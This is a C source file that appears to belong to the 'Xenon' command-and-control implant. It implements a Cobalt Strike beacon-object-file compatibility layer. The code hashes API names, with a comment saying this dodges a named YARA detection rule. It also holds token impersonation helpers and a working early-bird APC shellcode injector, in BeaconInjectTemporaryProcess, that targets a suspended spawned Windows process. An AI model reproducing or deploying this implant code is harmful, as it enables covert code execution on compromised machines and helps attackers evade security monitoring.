/**
 * Cobalt Strike 4.X BOF compatibility layer
 * -----------------------------------------
 * @ref https://github.com/trustedsec/COFFLoader/blob/main/beacon_compatibility.c
 * The whole point of these files are to allow beacon object files built for CS
 * to run fine inside of other tools without having to modify them.
 *
 * Built off of the beacon.h file provided to build for CS.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include "Xenon.h"
#include "Config.h"
#include "Debug.h"

#ifdef INCLUDE_CMD_INLINE_EXECUTE

#ifdef _WIN32
#include <windows.h>

#include "BeaconCompatibility.h"

// #define DEFAULTPROCESSNAME "rundll32.exe"
#ifdef _WIN64
#define X86PATH "SysWOW64"
#define X64PATH "System32"
#else
#define X86PATH "System32"
#define X64PATH "sysnative"
#endif


/* 
    Resolve BOF functions by comparing function hashes
    "Windows.Hacktool.COFFLoader" Yara Rule was triggering Beacon* strings
*/
#define BeaconDataParse_HASH 0xF399E2A0
#define BeaconDataInt_HASH 0x3B3B237A
#define BeaconDataShort_HASH 0x1C1A2EE1
#define BeaconDataLength_HASH 0x9D43F5D1
#define BeaconDataExtract_HASH 0xBBF350C2
#define BeaconFormatAlloc_HASH 0x9A7EB077
#define BeaconFormatReset_HASH 0x7BFDA659
#define BeaconFormatFree_HASH 0xA44B95F4
#define BeaconFormatAppend_HASH 0xA92FFFE2
#define BeaconFormatPrintf_HASH 0x5EC34A75
#define BeaconFormatToString_HASH 0xCD760EEE
#define BeaconFormatInt_HASH 0xF037F8B7
#define BeaconPrintf_HASH 0x0B760976
#define BeaconOutput_HASH 0xA5575830
#define BeaconUseToken_HASH 0xC7B994C5
#define BeaconRevertToken_HASH 0x2BCCCFDC
#define BeaconIsAdmin_HASH 0xD0C500B8
#define BeaconGetSpawnTo_HASH 0xAA1CCA43
#define BeaconSpawnTemporaryProcess_HASH 0x285C0C78
#define BeaconInjectProcess_HASH 0x4E732F0D
#define BeaconInjectTemporaryProcess_HASH 0x9B151F24
#define BeaconCleanupProcess_HASH 0x383C06BC
#define toWideChar_HASH 0xA2AF2403
#define LoadLibraryA_HASH 0x53B2070F
#define GetProcAddress_HASH 0xF8F45725
#define GetModuleHandleA_HASH 0xE463DA3C
#define FreeLibrary_HASH 0xAB45C5EE
#define __C_specific_handler_HASH 0x174C6982

unsigned char* InternalFunctions[30][2] = {
    {(uint32_t)BeaconDataParse_HASH, (unsigned char*)BeaconDataParse},
    {(uint32_t)BeaconDataInt_HASH, (unsigned char*)BeaconDataInt},
    {(uint32_t)BeaconDataShort_HASH, (unsigned char*)BeaconDataShort},
    {(uint32_t)BeaconDataLength_HASH, (unsigned char*)BeaconDataLength},
    {(uint32_t)BeaconDataExtract_HASH, (unsigned char*)BeaconDataExtract},
    {(uint32_t)BeaconFormatAlloc_HASH, (unsigned char*)BeaconFormatAlloc},
    {(uint32_t)BeaconFormatReset_HASH, (unsigned char*)BeaconFormatReset},
    {(uint32_t)BeaconFormatFree_HASH, (unsigned char*)BeaconFormatFree},
    {(uint32_t)BeaconFormatAppend_HASH, (unsigned char*)BeaconFormatAppend},
    {(uint32_t)BeaconFormatPrintf_HASH, (unsigned char*)BeaconFormatPrintf},
    {(uint32_t)BeaconFormatToString_HASH, (unsigned char*)BeaconFormatToString},
    {(uint32_t)BeaconFormatInt_HASH, (unsigned char*)BeaconFormatInt},
    {(uint32_t)BeaconPrintf_HASH, (unsigned char*)BeaconPrintf},
    {(uint32_t)BeaconOutput_HASH, (unsigned char*)BeaconOutput},
    {(uint32_t)BeaconUseToken_HASH, (unsigned char*)BeaconUseToken},
    {(uint32_t)BeaconRevertToken_HASH, (unsigned char*)BeaconRevertToken},
    {(uint32_t)BeaconIsAdmin_HASH, (unsigned char*)BeaconIsAdmin},
    {(uint32_t)BeaconGetSpawnTo_HASH, (unsigned char*)BeaconGetSpawnTo},
    {(uint32_t)BeaconSpawnTemporaryProcess_HASH, (unsigned char*)BeaconSpawnTemporaryProcess},
    {(uint32_t)BeaconInjectProcess_HASH, (unsigned char*)BeaconInjectProcess},
    {(uint32_t)BeaconInjectTemporaryProcess_HASH, (unsigned char*)BeaconInjectTemporaryProcess},
    {(uint32_t)BeaconCleanupProcess_HASH, (unsigned char*)BeaconCleanupProcess},
    {(uint32_t)toWideChar_HASH, (unsigned char*)toWideChar},
    {(uint32_t)LoadLibraryA_HASH, (unsigned char*)LoadLibraryA},
    {(uint32_t)GetProcAddress_HASH, (unsigned char*)GetProcAddress},
    {(uint32_t)GetModuleHandleA_HASH, (unsigned char*)GetModuleHandleA},
    {(uint32_t)FreeLibrary_HASH, (unsigned char*)FreeLibrary},
    {(uint32_t)__C_specific_handler_HASH, (unsigned char*)NULL},
};

char* beacon_compatibility_output = NULL;
int beacon_compatibility_size = 0;
int beacon_compatibility_offset = 0;

UINT32 swap_endianess(UINT32 indata) {
    UINT32 testint = 0xaabbccdd;
    UINT32 outint = indata;
    if (((unsigned char*)&testint)[0] == 0xdd) {
        ((unsigned char*)&outint)[0] = ((unsigned char*)&indata)[3];
        ((unsigned char*)&outint)[1] = ((unsigned char*)&indata)[2];
        ((unsigned char*)&outint)[2] = ((unsigned char*)&indata)[1];
        ((unsigned char*)&outint)[3] = ((unsigned char*)&indata)[0];
    }
    return outint;
}


void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (parser == NULL) {
        return;
    }
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size - 4;
    parser->size = size - 4;
    parser->buffer += 4;
    return;
}

int BeaconDataInt(datap* parser) {
    int32_t fourbyteint = 0;
    if (parser->length < 4) {
        return 0;
    }
    memcpy(&fourbyteint, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return (int)fourbyteint;
}

short BeaconDataShort(datap* parser) {
    int16_t retvalue = 0;
    if (parser->length < 2) {
        return 0;
    }
    memcpy(&retvalue, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return (short)retvalue;
}

int BeaconDataLength(datap* parser) {
    return parser->length;
}

char* BeaconDataExtract(datap* parser, int* size) {
    UINT32 length = 0;
    char* outdata = NULL;
    /*Length prefixed binary blob, going to assume UINT32 for this.*/
    if (parser->length < 4) {
        return NULL;
    }
    memcpy(&length, parser->buffer, 4);
    parser->buffer += 4;

    outdata = parser->buffer;
    if (outdata == NULL) {
        return NULL;
    }
    parser->length -= 4;
    parser->length -= length;
    parser->buffer += length;
    if (size != NULL && outdata != NULL) {
        *size = length;
    }
    return outdata;
}

/* format API */

void BeaconFormatAlloc(formatp* format, int maxsz) {
    if (format == NULL) {
        return;
    }
    format->original = calloc(maxsz, 1);
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
    return;
}

void BeaconFormatReset(formatp* format) {
    memset(format->original, 0, format->size);
    format->buffer = format->original;
    format->length = format->size;
    return;
}

void BeaconFormatFree(formatp* format) {
    if (format == NULL) {
        return;
    }
    if (format->original) {
        free(format->original);
        format->original = NULL;
    }
    format->buffer = NULL;
    format->length = 0;
    format->size = 0;
    return;
}

void BeaconFormatAppend(formatp* format, char* text, int len) {
    memcpy(format->buffer, text, len);
    format->buffer += len;
    format->length += len;
    return;
}

void BeaconFormatPrintf(formatp* format, char* fmt, ...) {
    /*Take format string, and sprintf it into here*/
    va_list args;
    int length = 0;

    va_start(args, fmt);
    length = vsnprintf(NULL, 0, fmt, args);
    va_end(args);
    if (format->length + length > format->size) {
        return;
    }

    va_start(args, fmt);
    (void)vsnprintf(format->buffer, length, fmt, args);
    va_end(args);
    format->length += length;
    format->buffer += length;
    return;
}


char* BeaconFormatToString(formatp* format, int* size) {
    *size = format->length;
    return format->original;
}

void BeaconFormatInt(formatp* format, int value) {
    UINT32 indata = value;
    UINT32 outdata = 0;
    if (format->length + 4 > format->size) {
        return;
    }
    outdata = swap_endianess(indata);
    memcpy(format->buffer, &outdata, 4);
    format->length += 4;
    format->buffer += 4;
    return;
}

/* Main output functions */

void BeaconPrintf(int type, char* fmt, ...) {
    /* Change to maintain internal buffer, and return after done running. */
    int length = 0;
    char* tempptr = NULL;
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);

    va_start(args, fmt);
    length = vsnprintf(NULL, 0, fmt, args);
    va_end(args);
    tempptr = realloc(beacon_compatibility_output, beacon_compatibility_size + length + 1);
    if (tempptr == NULL) {
        return;
    }
    beacon_compatibility_output = tempptr;
    memset(beacon_compatibility_output + beacon_compatibility_offset, 0, length + 1);
    va_start(args, fmt);
    length = vsnprintf(beacon_compatibility_output + beacon_compatibility_offset, length + 1, fmt, args);
    beacon_compatibility_size += length;
    beacon_compatibility_offset += length;
    va_end(args);
    return;
}

void BeaconOutput(int type, char* data, int len) {
    char* tempptr = NULL;
    tempptr = realloc(beacon_compatibility_output, beacon_compatibility_size + len + 1);
    beacon_compatibility_output = tempptr;
    if (tempptr == NULL) {
        return;
    }
    memset(beacon_compatibility_output + beacon_compatibility_offset, 0, len + 1);
    memcpy(beacon_compatibility_output + beacon_compatibility_offset, data, len);
    beacon_compatibility_size += len;
    beacon_compatibility_offset += len;
    return;
}

/* Token Functions */

BOOL BeaconUseToken(HANDLE token) {
    /* Probably needs to handle DuplicateTokenEx too */
    SetThreadToken(NULL, token);
    return TRUE;
}

void BeaconRevertToken(void) {
    if (!RevertToSelf()) {
#ifdef DEBUG
        printf("RevertToSelf Failed!\n");
#endif
    }
    return;
}

BOOL BeaconIsAdmin(void) {
    /* Leaving this to be implemented by people needing it */
#ifdef DEBUG
    printf("BeaconIsAdmin Called\n");
#endif
    return FALSE;
}

/* Injection/spawning related stuffs
 *
 */
void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
	CHAR tempBufferPath [MAX_PATH * 2];

    if (buffer == NULL) {
        return;
    }
    if (x86) {
        sprintf(tempBufferPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
    }
    else {
        sprintf(tempBufferPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
    }

    if ((int)strlen(tempBufferPath) > length) {
        return;
    }

    memcpy(buffer, tempBufferPath, strlen(tempBufferPath));

    return;
}


// BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo)
// {
// 	SECURITY_ATTRIBUTES saAttr = { 0 };
// 	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
// 	saAttr.bInheritHandle = TRUE;
// 	saAttr.lpSecurityDescriptor = NULL;

// 	HANDLE hStdOutRead;
// 	HANDLE hStdOutWrite;

// 	/* Create an anonymous pipe */
// 	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
// 		_dbg("Failed to create anonymous pipe .\n");
// 		return FALSE;
// 	}

// 	/* Prevent child from inheriting the read handle */
// 	SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

// 	/* Set up STARTUPINFO for output redirection */
// 	sInfo->hStdOutput = hStdOutWrite;
// 	sInfo->hStdError = hStdOutWrite;
// 	sInfo->dwFlags |= STARTF_USESTDHANDLES;

// 	/* Create full path of target process */
//     CHAR lpPath   [MAX_PATH * 2];
//     if (x86) {
//         sprintf(lpPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
//     }
//     else {
//         sprintf(lpPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
//     }

//     BOOL bSuccess = FALSE;

//     bSuccess = CreateProcessA(
//         NULL, 
//         lpPath, 
//         NULL, 
//         NULL, 
//         TRUE, 
//         CREATE_SUSPENDED | CREATE_NO_WINDOW, 
//         NULL, 
//         NULL, 
//         sInfo, 
//         pInfo
//     );

// 	/* Close the write handle in the parent (no longer needed) */
// 	CloseHandle(hStdOutWrite);

//     return bSuccess;
// }

BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
    BOOL bSuccess = FALSE;
    CHAR lpPath   [MAX_PATH * 2];
	
    if (x86) {
        sprintf(lpPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
    }
    else {
        sprintf(lpPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
    }

    bSuccess = CreateProcessA(
        NULL, 
        lpPath, 
        NULL, 
        NULL, 
        TRUE, 
        CREATE_SUSPENDED | CREATE_NO_WINDOW, 
        NULL, 
        NULL, 
        sInfo, 
        pInfo
    );

    return bSuccess;
}

void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {
    /* Leaving this to be implemented by people needing/wanting it */
    return;
}

void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
    /* The most basic injection as a placeholder */
    
    /* Commented out for detection purposes */
    HANDLE hProc                    = pInfo->hProcess;
    HANDLE hThread                  = pInfo->hThread;
    PVOID pAddress                  = NULL;
    SIZE_T szNumberOfBytesWritten   = NULL;
    DWORD dwOldProtection           = NULL;
	SIZE_T szAllocSize              = p_len;

    // Allocate
    pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
		_dbg("\t[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
		return;
	}

    // Write
	if (!WriteProcessMemory(hProc, (LPVOID)pAddress, (LPCVOID)payload, (SIZE_T)p_len, &szNumberOfBytesWritten) || szNumberOfBytesWritten != p_len) {
		_dbg("[!] Failed to write process memory : %d\n", GetLastError());
		return;
	}

    // Memory page executable (RX)
    if (!VirtualProtectEx(hProc, pAddress, p_len, PAGE_EXECUTE_READ, &dwOldProtection)) {
		_dbg("[!] VirtualProtect Failed With Error : %d\n", GetLastError());
		return;
	}

    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		_dbg("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return;
	}

    // Execute shellcode
    ResumeThread(hThread);

    return;
}
/* --------------------------------------------------------------------------------------------------------------------------------------------------------- */

void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
    (void)CloseHandle(pInfo->hThread);
    (void)CloseHandle(pInfo->hProcess);
    return;
}

BOOL toWideChar(char* src, wchar_t* dst, int max) {
    if (max < sizeof(wchar_t))
        return FALSE;
    return MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, src, -1, dst, max / sizeof(wchar_t));
}

// Caller must free the output data
char* BeaconGetOutputData(int* outsize) {
    char* outdata = beacon_compatibility_output;
    *outsize = beacon_compatibility_size;
    beacon_compatibility_output = NULL;
    beacon_compatibility_size = 0;
    beacon_compatibility_offset = 0;
    return outdata;
}

#endif


#endif //INCLUDE_CMD_INLINE_EXECUTE